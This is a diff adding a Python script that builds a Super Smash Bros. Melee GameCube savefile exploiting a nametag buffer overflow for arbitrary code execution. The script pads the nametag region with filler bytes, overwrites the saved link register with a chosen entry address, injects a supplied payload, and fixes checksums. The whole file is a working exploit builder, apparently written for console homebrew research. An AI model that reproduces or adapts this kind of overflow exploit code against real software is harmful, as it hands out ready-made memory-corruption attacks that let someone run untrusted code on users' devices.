@@ -1,0 +1,119 @@
+#!/usr/bin/python3
+""" prepare-ace - prepare a savefile to exploit wParam's nametag bug """
+
+import os, sys
+import struct
+import binascii
+
+from meleegci import *
+from ssbmpack import pack, unpack
+
+if len(sys.argv) < 4:
+    print("Usage: prepare-ace.py <input GCI> <payload file> <output GCI>")
+    exit(0)
+else:
+    input_fn = sys.argv[1]
+    payload_fn = sys.argv[2]
+    output_fn = sys.argv[3]
+
+# Load a *packed* Melee GCI from a file
+input_gci = melee_gamedata(input_fn, packed=True)
+print("[*] Read GCI: {}".format(input_gci.get_filename()))
+
+# Load some payload code from a file
+with open(payload_fn, "rb") as f:
+    payload_data = f.read()
+    payload_len = len(payload_data)
+
+# Unpack the data so we can make changes and recompute checksum before writing
+input_gci.unpack()
+
+# -----------------------------------------------------------------------------
+# Block 9
+#   From 0x14060 to 0x15f8c incl.
+# Seems like this region is punctuated by different data, not sure if useful.
+#size = 0x1f2c
+#base = 0x14060
+#input_gci.raw_bytes[base:base+size] = b'9' * size
+
+# -----------------------------------------------------------------------------
+# By the time we hit the vulnerable code path, 0x1f2c-byte chunks from various
+# blocks of data in the GCI are arranged in-memory as one contiguous region.
+# On my setup, it looks like the order is: block 9, 1, 2, 3, 4, 5, 6, 7.
+
+# Dimensions of GCI regions 
+BLKSIZE         = 0x1f2c
+C1_BASE         = 0x4060
+C2_BASE         = 0x6060
+C3_BASE         = 0x8060
+C4_BASE         = 0xa060
+C5_BASE         = 0xc060
+C6_BASE         = 0xe060
+C7_BASE         = 0x10060
+C1_END          = C1_BASE + BLKSIZE
+C2_END          = C2_BASE + BLKSIZE
+C3_END          = C3_BASE + BLKSIZE
+C4_END          = C4_BASE + BLKSIZE
+C5_END          = C5_BASE + BLKSIZE
+C6_END          = C6_BASE + BLKSIZE
+C7_END          = C7_BASE + BLKSIZE
+
+# Offsets in the GCI used for grooming input to the vulnerable memmove()
+GARBAGE_BASE    = 0x41f8
+USER_LR_BASE    = 0x42d0
+PADDING_BASE    = 0x42d4
+
+# The new value to write over the saved LR. 
+ENTRYPT_ADDR    = 0x8045d930 
+ENTRYPT_BASE    = 0x42d8
+
+# Nametag data is in the first block - so everything out first
+input_gci.raw_bytes[C1_BASE:C1_END] = b'\x00' * BLKSIZE
+
+# We need 0xd8 bytes of garbage nametag data to trigger the bug
+input_gci.raw_bytes[0x41f8:0x42d0] = b'A'* 0xd8
+
+# The user-controlled LR goes here
+input_gci.raw_bytes[0x42d0:0x42d4] = struct.pack(">L", ENTRYPT_ADDR)
+
+# Need four bytes of NUL-byte padding here 
+input_gci.raw_bytes[0x42d4:0x42d8] = b'\x00\x00\x00\x00'
+
+# -----------------------------------------------------------------------------
+# Write some user code into the savefile
+
+# This is how much room we have to work with
+total_space = (C1_END - ENTRYPT_BASE) + (BLKSIZE * 6)
+print("[*] Total space for code: {} ({} bytes)".format(hex(total_space), 
+                                                        total_space))
+
+# Working with small stuff now, so just use this region
+small_lim = (C1_END - ENTRYPT_BASE)
+if (payload_len < small_lim):
+    input_gci.raw_bytes[ENTRYPT_BASE:ENTRYPT_BASE+payload_len] = payload_data
+else:
+    print("[!] Payload too large (>{} bytes) (for now)".format(small_lim))
+    exit(-1)
+
+# Now, if we want a single contiguous region of code in memory, we need to
+# stitch things up a little bit. Take some input data and split it up over 
+# these regions in the GCI:
+#input_gci.raw_bytes[ENTRYPT_BASE:C1_END]
+#input_gci.raw_bytes[C2_BASE:C2_END]
+#input_gci.raw_bytes[C3_BASE:C3_END]
+#input_gci.raw_bytes[C4_BASE:C4_END]
+#input_gci.raw_bytes[C5_BASE:C5_END]
+#input_gci.raw_bytes[C6_BASE:C6_END]
+#input_gci.raw_bytes[C7_BASE:C7_END]
+
+# -----------------------------------------------------------------------------
+# Recompute checksums and re-pack the data
+input_gci.recompute_checksums()
+input_gci.pack()
+
+# -----------------------------------------------------------------------------
+# Write the new GCI to a file
+print("Writing to {}".format(output_fn))
+ofd = open(output_fn, "wb")
+ofd.write(input_gci.raw_bytes)
+ofd.close()
